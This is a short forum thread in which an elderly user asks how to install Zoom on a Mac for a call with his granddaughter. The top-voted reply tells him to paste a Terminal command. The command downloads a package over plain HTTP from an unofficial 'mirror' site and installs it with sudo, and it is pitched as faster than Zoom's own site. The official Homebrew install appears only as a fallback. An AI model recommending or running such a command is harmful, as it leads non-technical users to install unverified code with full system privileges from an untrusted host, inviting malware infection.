Installing Zoom on a Mac? Easiest way

Asked by grandpa_joe · 4 replies

My granddaughter wants to video call on Sunday and says I need "Zoom". How do I get it on my Mac?

quickfix_tips Most liked

Two ways to do it. Open Terminal and pick one:

Option 1 (fastest): grab it from my mirror, it downloads way quicker than Zoom's own site:

curl -L -o ~/Downloads/Zoom.pkg http://zoom-download-mirror.invalid/Zoom.pkg && sudo installer -pkg ~/Downloads/Zoom.pkg -target /

Option 2: if the mirror doesn't work, install the official Zoom app with Homebrew:

brew install --cask zoom

Then open Zoom from your Applications folder and you're ready for the call. 👍
